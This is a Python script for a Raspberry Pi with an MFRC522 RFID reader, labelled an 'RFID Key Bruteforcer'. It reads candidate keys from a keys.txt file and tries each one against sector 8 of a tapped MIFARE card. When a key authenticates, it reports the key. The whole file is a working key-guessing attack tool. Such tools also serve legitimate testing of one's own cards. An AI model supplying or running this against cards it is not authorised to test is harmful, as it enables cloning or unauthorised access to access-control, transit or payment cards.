#!/bin/python

import RPi.GPIO as GPIO, mfrc522, signal, sys, time

continue_reading = True

# Capture SIGINT for cleanup when the script is aborted.
def end_read(signal, frame):
    global continue_reading
    print("[!] INTERRUPT [!] - Ctrl+C captured, stopping program and cleaning up.")
    continue_reading = False
    GPIO.cleanup()

# Hook the SIGINT.
signal.signal(signal.SIGINT, end_read)

# Create an object of the class MFRC522.
MIFAREReader = MFRC522.MFRC522()

# Welcome message.
print("[i] RFID Key Bruteforcer.")
print("[i] Written by Matthew Brittain, built on https://github.com/mxgxw/MFRC522-python.")
print("[i] Press Ctrl-C to stop the program.")

# This loop keeps checking for chips. If one is near it will get the UID and authenticate.
while continue_reading:

    try:
        # Import keys to test from text file.
        with open('keys.txt') as lines:
            newlines = lines.read().splitlines()
    except:
        sys.exit("[-] Failed to open file keys.txt.")
    
    for newline in newlines:
        # Scan for cards.
        (status, TagType) = MIFAREReader.MFRC522_Request(MIFAREReader.PICC_REQIDL)

        # If a card is found.
        if status == MIFAREReader.MI_OK:
            print("[+] Card tap-on detected.")

            # Get the UID of the card.
            (status, uid) = MIFAREReader.MFRC522_Anticoll()

            # If we have the UID, continue.
            if status == MIFAREReader.MI_OK:

                # Print UID
                print("[+] Card read UID: " + ",".join(str(u) for u in uid) + ".")

                # This is the default key for authentication:
                # key = [0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]

                # Strip the imported UID of commas.
                keya = [byte.strip() for byte in newline.split(',')]
                keyanew = []
                for k in keya:
                    nk = k.replace(' ','')
                    keyanew.append(nk)
                key = [int(byte2,16) for byte2 in keyanew]
                print("[i] Trying the key: " + str(key) + ". Please tap RFID card on now.")
                
                # Select the scanned tag.
                MIFAREReader.MFRC522_SelectTag(uid)

                # Authenticate.
                status = MIFAREReader.MFRC522_Auth(MIFAREReader.PICC_AUTHENT1A, 8, key, uid)

                # Check if authenticated.
                if status == MIFAREReader.MI_OK:
                    MIFAREReader.MFRC522_Read(8)
                    MIFAREReader.MFRC522_StopCrypto1()
                    sys.exit("[!] SUCCESS [!] - The correct key is " + str(key))

                else:
                    print("[-] Authentication error")
        #else:
            #print("[-] Card not detected.")
